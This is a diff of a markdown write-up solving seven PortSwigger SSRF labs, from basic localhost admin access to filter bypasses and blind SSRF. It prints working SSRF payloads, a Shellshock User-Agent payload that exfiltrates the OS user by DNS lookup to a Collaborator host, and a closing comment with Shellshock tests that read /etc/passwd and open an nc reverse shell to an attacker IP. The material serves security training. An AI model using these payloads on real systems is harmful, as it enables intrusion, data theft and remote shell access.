@@ -1,7 +1,10 @@
+<span style="color:yellow;font-weight:700;font-size:30px">
+Server-side request forgery (SSRF) - 5 Labs
+</span>
 https://portswigger.net/web-security/ssrf
 
 
-# 1. Lab: Basic SSRF against the local server
+# ***1. Lab: Basic SSRF against the local server***
 https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
 
 Goal:
@@ -16,8 +19,9 @@ Host: ac3f1f371fca19aac066a754004e005a.web-security-academy.net
 stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D4%26storeId%3D1
 ```
 
-payload 1:
+**payload 1**:
 stockApi=http://localhost/admin
+
 response:
 ```htm
 <h1>Users</h1>
@@ -31,22 +35,16 @@ stockApi=http://localhost/admin/delete?username=carlos
 **deleted**!
 
 
-# 2. Lab: Basic SSRF against another back-end system
+# ***2. Lab: Basic SSRF against another back-end system***
 https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system\
 
-to solve the lab:
+to solve the lab:scan 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 
 
-scan 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 
+1. **request** the same vulnarbility as in lab 1:
+    POST /product/stock HTTP/1.1
+    ...
 
-request the same vulnarbility as in lab 1:
-
-```htm
-POST /product/stock HTTP/1.1
-Host: 065406a7304f37e005aca19aacacf11f.web-security-academy.net
-...
-
-stockApi=http://192.168.0.1/admin
-```
+    stockApi=http://192.168.0.1/admin
 
 response: 
 
@@ -60,17 +58,10 @@ Content-Length: 102
 '"
 ```
 
-lets send it to intruder:
-
-using Numbers type for payload:
-
-0 to 255
-
+2. lets send it to intruder:using Numbers type for payload:0 to 255
 
 response:
-
-(many 400 status code, waiting for 200 status code...burp comunity is taking forever! lets code a simple script to scan range 192.168.0.x:
-
+    (many 400 status code, waiting for 200 status code...burp comunity is taking forever! lets code a simple script to scan range 192.168.0.x:
 
 (https://github.com/n1njaZ0Z/Labs_Portswigger/blob/main/SSRF/Lab:%20Basic%20SSRF%20against%20another%20back-end%20system.py)
 
@@ -85,7 +76,7 @@ stockApi=http://192.168.0.1/admin/delete?username=carlos
 **deleted**!
 
 
-# 3. Lab: SSRF with blacklist-based input filter
+# ***3. Lab: SSRF with blacklist-based input filter***
 https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
 
 
@@ -116,7 +107,7 @@ http://127.0.0.01/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=
 **deleted!**
 
 
-# 4. Lab: SSRF with whitelist-based input filter
+# ***4. Lab: SSRF with whitelist-based input filter***
 https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter
 
 Goal:
@@ -151,7 +142,7 @@ http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos // 302
 **lab solved**
 
 # **payload structure:**
-**{protocol}{payload}%2523{whitelisted.site}**
+    {protocol}{payload}%2523{whitelisted.site}
 
 {protocol} = **http://**
 
@@ -163,37 +154,26 @@ http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos // 302
 5. **/admin/delete?username=carlos** - our actual command 
 
 
-
-
 **how waf parse it:**
-
 1. **username:** localhost%23
-
 2. **white listed approved url:** stock.weliketoshop.net/admin/delete?username=carlos
 
 
-
 **how server parse it:**
-
 1. **url:** localhost
-
 2. **url fragment(ignored):** #@stock.weliketoshop.net
-
 3. **url subdirectories:** /admin/delete?username=carlos  (according to RFC 3986 path section starts with the **/**  char)
 
 
 **suggested materials:**
 
 A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! 
-
 Orange Tsai's talk at: https://www.youtube.com/watch?v=voTHFdL9S2k
 <!-- 
 not relevant to this drill but still cool: ["ss", "SS"].indexOf("ß") = False -->
 
-#
 
-
-# **5. SSRF with filter bypass via open redirection vulnerability**
+# ***5. SSRF with filter bypass via open redirection vulnerability***
 https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
 
 
@@ -336,7 +316,66 @@ Content-Length: 0
 
 
 
+<span style="color:yellow;font-weight:700;font-size:30px">
+Blind SSRF vulnerabilities - 2 Labs
+</span>
+https://portswigger.net/web-security/ssrf/blind
 
+# ***1. Lab: Blind SSRF with out-of-band detection***
+https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection
+ This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
+
+To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server. 
+
+**colaborator**: bydjhao6u993vhklodbzonm6ux0soh.oastify.com
+
+request:
+GET /product?productId=4 HTTP/1.1
+Host: 0a60003d04b28048c0a3790100f60037.web-security-academy.net
+Referer: https://xfg5yw5sbvqpc3175zsl593sbjhf54.oastify.com
+..
+
+response in burp colaborator:
+    X2 DNS queries + HTTP request
+
+# Lab Solved
+
+# ***2. Lab: Blind SSRF with Shellshock exploitation***
+https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation
+
+ This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
+
+To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user. 
+
+1. enable Collaborator-everywhere extention and browse the site. in **Target** look for **Issues** marked in red name **Pinback** - find two issue in **/product** page: first note **referer header** send a request to burp collaborator and secondly observe **User-Agent header** is being reflected:
+
+ GET /ref HTTP/1.1
+    Host: yrt3r17z6udnquokvsqspvbvjmpej28.oastify.com
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@b2eg2eich7o017zx651508m8uz0q2er.oastify.com
+    Accept-Encoding: gzip
+
+2. craft a payload based on **shellshok** command that initiate a *nslookup* to a collaboraptor address with **whoami** value as its subdomain. use the payload in the User-Agent header:
+    User-Agent: () { :; }; /usr/bin/nslookup $(whoami).ltitckjgpj4dqrfvjn69jxhgp7v9jy.oastify.com
+
+3. observe response:
+    The Collaborator server received a DNS lookup of type A for the domain name peter-13QuIW.ltitckjgpj4dqrfvjn69jxhgp7v9jy.oastify.com.  The lookup was received from IP address 3.251.104.241 at 2022-Oct-25 19:00:35 UTC.
+
+4. copy *peter-13QuIW* and submit
+
+# Lab Solved!
+
+
+
+
+<!-- 
+shellshock exaples and tests:
+baisc test:
+env X='() { :; }; echo "pwned"' bash -c :
+() { :; }; echo "pwned"
+() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
+() { :; }; echo "NS:" $(</etc/passwd)>)
+reverse shell:
+env X='() { :; }; nc <attacker_ip> <port> -e /bin/bash &' bash -c : -->
 
 
 
